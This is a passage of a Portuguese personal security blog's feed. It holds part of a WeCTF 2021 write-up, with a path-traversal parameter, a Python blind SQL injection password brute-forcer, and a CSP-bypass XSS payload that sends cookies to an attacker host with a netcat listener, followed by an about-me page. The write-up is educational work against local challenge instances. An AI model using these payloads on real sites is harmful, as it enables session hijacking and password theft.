&lt;p>Para isso, basta gerar um link no site alvo cujo sufixo passe pelo filtro de cache, mas o prefixo contenha a palavra &lt;code>flag&lt;/code>, e mandar para que o administrador acesse. Isso fará com que o arquivo seja disponibilizado para todos por causa do cache, mas o roteamento do site vai gerar a página com a informação confidencial. Ela estará disponível por 10s: tempo o suficiente para acessarmos a página e obter a flag!&lt;/p>
&lt;h2 id="include">Include&lt;/h2>
&lt;p>Nesse desafio temos uma página, que, quando aberta, reclama que não definimos um arquivo para ser apresentado. O código PHP no começo da página mostra que o arquivo tem que ser passado como parâmetro do GET, e também usando um emoji. O desafio também mostra que a flag está no arquivo &lt;code>flag.txt&lt;/code>. Sendo assim, basta acessar a página com o parâmetro a seguir e a flag é nossa!&lt;/p>
&lt;p>/?exploding_head=/flag.txt&lt;/p>
&lt;h2 id="phish">Phish&lt;/h2>
&lt;p>Esse desafio é interessante: a vítima dos desafios, Shou, caiu num site de phishing que não é nosso! Mas o site de phishing em si é vulnerável à SQLi, e sabendo disso, nosso objetivo é extrair a senha dele (a flag) desse site. Para esse caso, o código fonte nos mostra algo interessante: se a query para o banco de dados tiver algum tipo de erro, esse erro será retornado na tela, caso contrário, a query passa e ele redirecionará para a página que mostra que você teve sua senha roubada.&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/source_code_phish.png" alt="Código Fonte do Desafio">&lt;/p>
&lt;p>O site não possui nenhum tipo de reflexão de dados na tela, então algum tipo de SQLi que retorne a senha na tela é inviável. No entanto, podemos fazer diferente: como somente erros aparecem na tela, podemos fazer bruteforce da senha injetando uma query que insira uma senha no BD &lt;em>se e somente se&lt;/em> nosso palpite for uma parte da senha do Shou. Para fazer isso, escrevi o pequeno script abaixo, cujo payload do SQLi e detalhes eu vou descrever melhor abaixo.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">from&lt;/span> requests &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1:4008&amp;#34;&lt;/span>
s &lt;span style="color:#f92672">=&lt;/span> session()
passwd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;we{&amp;#34;&lt;/span>
name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;nomedeusuario&amp;#34;&lt;/span>
char &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;+&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#e6db74">&amp;#39;}&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> passwd:
&lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;?&amp;#39;&lt;/span>:
char &lt;span style="color:#f92672">=&lt;/span> chr(ord(char) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
passwd_iteration &lt;span style="color:#f92672">=&lt;/span> passwd &lt;span style="color:#f92672">+&lt;/span> char
sqli &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;qqrcoisa&amp;#39;,( SELECT password FROM user WHERE username=&amp;#39;shou&amp;#39; AND password GLOB &amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>passwd_iteration&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">*&amp;#39; ));--&amp;#34;&lt;/span>
form_data &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>: name,
&lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>: sqli
}
result &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>post(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>host&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/add&amp;#34;&lt;/span>,data&lt;span style="color:#f92672">=&lt;/span>form_data)
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Your password is leaked&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> result&lt;span style="color:#f92672">.&lt;/span>content &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;UNIQUE constraint failed&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> result&lt;span style="color:#f92672">.&lt;/span>content:
passwd &lt;span style="color:#f92672">+=&lt;/span> char
char &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;+&amp;#39;&lt;/span>
print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;gt; HIT: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>passwd&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">elif&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;NOT NULL constraint failed&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> result&lt;span style="color:#f92672">.&lt;/span>content:
&lt;span style="color:#75715e"># print(f&amp;#34;&amp;gt; NOT HIT: {passwd + char}&amp;#34;)&lt;/span>
char &lt;span style="color:#f92672">=&lt;/span> chr(ord(char) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>O banco de dados utiliza SQLite&lt;/li>
&lt;li>A ordem do &lt;code>INSERT&lt;/code> no código fonte é &lt;code>(password,username)&lt;/code>, então a injeção de SQL é no &lt;code>password&lt;/code>, para que eu possa injetar propriamente a subquery em questão&lt;/li>
&lt;li>A operação &lt;code>GLOB&lt;/code> é usada porque, ao invés do &lt;code>LIKE&lt;/code>, ele é case-sensitive.&lt;/li>
&lt;li>O &lt;code>UNIQUE constraint failed&lt;/code> passa como válido para a comparação de senha porque o erro vem de estarmos inserindo o mesmo usuário várias vezes, logo não implica que a comparação deu errado, então esse erro é um falso negativo&lt;/li>
&lt;/ul>
&lt;p>Com esse exploit, a senha será construida lentamente através das &amp;ldquo;confirmações&amp;rdquo; do banco de dados do site!&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/exploit_phishing.gif" alt="Exploit sendo executado">&lt;/p>
&lt;h2 id="csp-1">CSP 1&lt;/h2>
&lt;p>Esse foi o desafio dos quais eu mais lutei contra, por um motivo mais relacionado com o ambiente de teste do que o desafio em si, mas já já falo sobre isso. Ao iniciá-lo, você verá um site no qual você pode escrever num formulário um pequeno website, que pode ser acessado depois por um link gerado na hora. A princípio você pode pensar &amp;ldquo;ah, vou escrever uma tag script, rodar meu JS, pegar a flag e sair correndo&amp;rdquo;. Boa ideia, mas ela não vai funcionar, por um simples motivo: CSP, ou Content Security Policy.&lt;/p>
&lt;p>Content-Security-Policy é um cabeçalho de requisição enviado pelo servidor, que define o que pode e não pode ser executado ao acessar uma página. Quando enviamos o nosso projeto de website, ele nos retorna o site do jeito que fizemos, mas bloqueando conteúdos perigosos por meio dessa medida de segurança.&lt;/p>
&lt;p>Se fizermos um simples site com uma tag img, veremos que a página criada remove o arquivo desejado e deixa somente o domínio, para que imagens possam ser pegas nele. Então se enviamos uma url com &lt;code>https://evil.com/imagem.jpg&lt;/code> o CSP terá configurado com &lt;code>https://evil.com&lt;/code> somente&lt;/p>
&lt;p>Isso mostra que o que é passado pro atributo src é colocado no CSP pelo servidor. Sendo assim, isso abre uma possibilidade para alterar o que tem no CSP, permitindo que façamos um site com XSS para enviar ao administrador e pegar a flag!&lt;/p>
&lt;p>Lendo mais sobre o CSP, é possível ver que o atributo &lt;code>script-src&lt;/code> define se scripts podem ser rodados no site em questão. No site alvo, ele está desabilitado, mas ao injetarmos nosso próprio &lt;code>script-src&lt;/code> com o valor &lt;code>unsafe-inline&lt;/code>, podemos agora fazer tags script e executar código.&lt;/p>
&lt;p>A partir daqui, bastaria fazer um fetch com os dados do cookie para um domínio ou servidor que controlamos e sucesso, certo? Errado, por um simples motívo: fetch está bloqueado pelo CSP, e como está antes da nossa injeção, não podemos sobrescrevê-lo. Mas não seja por isso: basta, ao injetar o CSP, autorizar um domínio nosso e, por meio de outra imagem, exfiltrar os dados. Isso pode ser feito da seguinte forma:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">setTimeout&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span>(){
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">imgNova&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">createElement&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;img&amp;#34;&lt;/span>);
&lt;span style="color:#a6e22e">imgNova&lt;/span>.&lt;span style="color:#a6e22e">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://meu.pc:8001/?cookie=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> document.&lt;span style="color:#a6e22e">cookie&lt;/span>;
},&lt;span style="color:#ae81ff">2000&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note que a url em questão é meu.pc. Isso se dá porque tem um pequeno problema de fazer esse desafio usando localhost: como tanto a máquina do atacante como a máquina da vítima estão no mesmo domínio de rede, o cookie de autenticação será enviado mesmo se você não exfiltrar ele, porque ele é considerado como Same Origin. Para fazer com que o desafio ficasse mais parecido com o real, eu adicionei no &lt;code>/etc/hosts&lt;/code> uma linha que define outro nome para localhost: &lt;code>meu.pc&lt;/code>. Dessa forma, eu não tomo um &lt;em>spoiler&lt;/em> do desafio!&lt;/p>
&lt;p>E passando esse link para o computador da vítima (no mesmo jeito com a pasta &lt;code>uv_worker&lt;/code> que os outros desafios), quando ela acessar, uma requisição será enviada para localhost:8001. Para ver o que é mandado lá, basta &amp;ldquo;ouvir&amp;rdquo; usando netcat (&lt;code>ncat -lk localhost 8001&lt;/code>) e o cookie chegará da seguinte forma:&lt;/p>
&lt;p>&lt;img src="https://dandeeccastro.github.io/blog/writeup-wectf-2021/flag_csp.png" alt="Output do netcat depois do exploit">&lt;/p>
&lt;h1 id="considerações-finais">Considerações Finais&lt;/h1>
&lt;p>Eu parei meu write up aqui por alguns motivos simples:&lt;/p>
&lt;ul>
&lt;li>Alguns containers não funcionam ainda no ambiente local, e não consegui descobrir o porque ainda&lt;/li>
&lt;li>Minhas férias acabaram, infelizmente&lt;/li>
&lt;li>Estou trabalhando em outros projetos relacionados à segurança (segredo)&lt;/li>
&lt;/ul>
&lt;p>Pretendo atualizar esse post com as próximas soluções que conseguir assim que tiver conseguido atacar o desafio, mas por enquanto fico por aqui. Obrigado por ter lido até aqui!&lt;/p></content></item><item><title>whoami</title><link>https://dandeeccastro.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://dandeeccastro.github.io/about/</guid><description>Quem sou eu? Meu nome é Danilo, sou um estudante de Ciência da Computação, acumulador de hobbies e no geral uma pessoa bem legal (segundo terceiros, obviamente).
Atualmente sigo estudando na faculdade, mas já tenho experiência considerável em algumas coisas interessantes, como:
Engenharia Reversa em Aplicações Mobile Desenvolvimento de Aplicações Web Aplicativos Android e iOS Eu também estou disponível para trocar código por dinheiro, então se você tiver interesse em me contratar para um trabalho independente ou para uma empresa, meus links estão disponíveis e DM&amp;rsquo;s abertas!</description><content>&lt;h1 id="quem-sou-eu">Quem sou eu?&lt;/h1>
&lt;p>Meu nome é Danilo, sou um estudante de Ciência da Computação, acumulador de hobbies e
no geral uma pessoa bem legal (segundo terceiros, obviamente).&lt;/p>
&lt;p>Atualmente sigo estudando na faculdade, mas já tenho experiência considerável em algumas coisas
interessantes, como:&lt;/p>
&lt;ul>
&lt;li>Engenharia Reversa em Aplicações Mobile&lt;/li>
&lt;li>Desenvolvimento de
&lt;ul>
&lt;li>Aplicações Web&lt;/li>
&lt;li>Aplicativos Android e iOS&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Eu também estou disponível para trocar código por dinheiro, então se você tiver interesse
em me contratar para um trabalho independente ou para uma empresa, meus links estão disponíveis
e DM&amp;rsquo;s abertas!&lt;/p>
&lt;h1 id="o-que-é-esse-blog">O que é esse blog?&lt;/h1>
&lt;p>Aqui é onde eu escrevo coisas que eu acho interessante e que provavelmente ia fazer
minha família me deserdar por não parar de falar sobre na mesa de jantar. São tanto
coisas envolvendo tech quanto coisas gerais que eu acho interessante de ser discutido&lt;/p>
&lt;p>Sinta-se à vontade, espero que a leitura seja boa e&amp;hellip; é isso, eu acho.&lt;/p></content></item></channel></rss>